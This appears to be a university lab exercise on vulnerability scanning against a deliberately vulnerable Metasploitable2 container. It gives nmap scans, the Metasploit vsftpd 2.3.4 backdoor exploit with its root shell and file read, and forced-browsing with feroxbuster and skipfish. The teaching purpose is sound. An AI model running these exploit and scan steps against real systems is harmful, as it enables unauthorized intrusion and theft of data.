# Your Turn! Exercise: Scanning for Vulnerabilities

<img src="https://media.giphy.com/media/13GIgrGdslD9oQ/giphy.gif" width=50%/>

The purpose of this exercise is to let you explore security related scanning activities in a lab environment.
After the exercises, you can adapt these to conduct a security analysis of your own servers and _ITU-MiniTwit_ applications.

**OBS**: Use the tools and techniques explained below only on your own servers and containers.
Depending on legislation, exploiting vulnerabilities to gain access to other's systems is considered a crime.

  - [1) Prepare Environment](#1-prepare-environment)
  - [2) Port Scanning with `nmap`](#2-port-scanning-with-nmap)
  - [3) Identifying and Exploiting Vulnerabilities with Metasploit](#3-identifying-and-exploiting-vulnerabilities-with-metasploit)
  - [4) Conduct a Forced Browsing Attack](#3-conduct-a-forced-browsing-attack)


## 1) Prepare Environment

### a) Setup a vulnerable 'victim' container we can exploit

We start a vulnerable Docker container with the `metasploitable2` image, which bundles many legacy services with vulnerabilities.
See more info [here](https://docs.rapid7.com/metasploit/metasploitable-2/).


```bash
# Setup a network for the containers
docker network create pentest

# Run the vulnerable docker container
docker run -it --network=pentest -h victim --name vulnerable.aa tleemcjr/metasploitable2

# Create a very important secret on the vulnerable container
echo 'flag{important_password_here}' > /root/important.txt

# Keep the terminal open throughout the exercise.
```

**Note**: The vulnerable Docker container is called `vulnerable.aa` and anyone on the docker network can now access it with this name.
Docker will redirect requests to this container, in a similar way a DNS would to any other server.
`vulnerable.aa` could be replaced with any website for any of the used tools, e.g., your _ITU-MiniTwit_ application.


### b) Installing Kali Linux

Kali Linux is a Linux distribution that bundles many tools for security testing.
Here, we use the Docker version, which does not come with as many tools, but they can easily be installed, and we can access the vulnerable container on the same Docker network.

```bash
# Installing Kali Linux in Docker
docker run -it --rm --network pentest kalilinux/kali-last-release /bin/bash

# Update list of packages which can be installed
apt update
```


## 2) Port Scanning with `nmap`

Let's first try using [`nmap`: the Network Mapper](https://nmap.org/).
It is a free tool which can be installed in the Kali Linux container with `apt install nmap -y`.

With `nmap` and the Kali Linux Docker container, you can perform port scans on any host.
But for this exercise, only port scan your own servers.

A basic port scan can be run with `nmap <host>`, where host can be a domain name or an IP address.
Scanning the `vulnerable.aa` container, results in output similar to the following:

```
┌──(root㉿42790269161b)-[/]
└─# nmap vulnerable.aa
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 19:32 UTC
Nmap scan report for vulnerable.aa (172.20.0.4)
Host is up (0.000013s latency).
rDNS record for 172.20.0.4: vulnerable.aa.pentest
Not shown: 979 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 02:42:AC:14:00:04 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.14 seconds
```

To probe open ports for service and version info, add the `-sV` flags.
You can then check the services reported by `nmap` for vulnerabilities online, e.g., using [CVEdetails](https://www.cvedetails.com/).
One can limit the range of scanned ports, e.g., to ports 0 to 100 with the flag `-p0-100`.
That is useful in case of a target host with many open ports, such as, the vulnerable container.

```
┌──(root㉿42790269161b)-[/]
└─# nmap -sV -p0-100 vulnerable.aa
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 19:30 UTC
Nmap scan report for vulnerable.aa (172.20.0.4)
Host is up (0.000013s latency).
rDNS record for 172.20.0.4: vulnerable.aa.pentest
Not shown: 96 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open  telnet  Linux telnetd
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
MAC Address: 02:42:AC:14:00:04 (Unknown)
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.27 seconds
```


## 3) Identifying and Exploiting Vulnerabilities with Metasploit

Metasploit is a framework of scripts to exploit vulnerable services.
One could interact with it through `msfconsole`, and automate the exploit process.
In your Kali Linux container, execute the following commands:

```bash
# In the Kali container:
apt install metasploit-framework -y  #takes a few minutes

# Starting metasploit
service postgresql start
msfdb reinit # if this is the first time you are running metasploit
msfconsole
```

The `nmap` port scan reported port 21 as open with FTP (version `vsftpd` 2.3.4).
Now, in the Metasploit console, check if there are any exploits defined for this version:

```
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

One can see that there is an exploit for this version of `vsftpd`, a ["backdoor"](https://en.wikipedia.org/wiki/Backdoor_(computing).
Let's try to exploit it to gain access to the vulnerable container.
To do so, execute the following commands in the Metasploit console:

```
# Select the exploit
use 1

# Set the target host and port
set rhosts vulnerable.aa
set rport 21

# Execute the exploit
exploit
```

If a message `Command shell session 1 opened` is displayed, then the exploit was executed successfully, and you have root access to the vulnerable container.
The Metasploit console connects you via a reverse shell to the exploited vulnerable container.
Any command you type will be executed on the exploited vulnerable container.
In reality, it would be executed directly on an exploited server.

```
[*] Command shell session 1 opened (172.20.0.2:34711 -> 172.20.0.4:6200) at 2025-04-07 19:42:39 +0000

whoami
root

cat /root/important.txt
flag{important_password_here}
```

**OBS**: Use Metasploit only on your own servers and containers.
Depending on legislation, exploiting vulnerabilities to gain access to other's systems is considered a crime.


## 4) Conduct a Forced Browsing Attack

### Enumerating a Website with `feroxbuster`

[`feroxbuster`](https://github.com/epi052/feroxbuster) is a tool which can find website resources, even if they are not referenced on the site (Forced Browsing).
For example, it can be used to identify hidden login pages, or other hidden content.
In the Kali Linux container, install the tool and conduct an attack against the vulnerable container.

```bash
apt install feroxbuster -y

# run the tool with -n for non-recursive, since there are so many webapps on the vulnerable machine.
feroxbuster -n -u  http://vulnerable.aa/
```


### Searching for Vulnerabilities with `skipfish`

[`skipfish`](https://www.kali.org/tools/skipfish/) _"an active web application security reconnaissance tool."_, similar to `feroxbuster`.
Start the Kali Linux container to store `skipfish`'s reports on the host and install the tool and conduct an attack against the vulnerable container.

```bash
# mapping a local folder where the html output is going to be saved
docker run -v /tmp:/home/$(whoami) -t -i --network=pentest kalilinux/kali-last-release /bin/bash

# inside the container now
apt install skipfish -y

# Change <YOUR-PATH> with something like ~/Desktop where the html output is going to be saved
skipfish -o <YOUR-PATH>/report http://vulnerable.aa
```


### Learn more

If you want more security/hacking exercises, lookup Capture The Flag(CTF) events, where you find exploits to get a secret text string, called a flag, to earn points.
You can check out sites like [picoCTF](https://play.picoctf.org/).
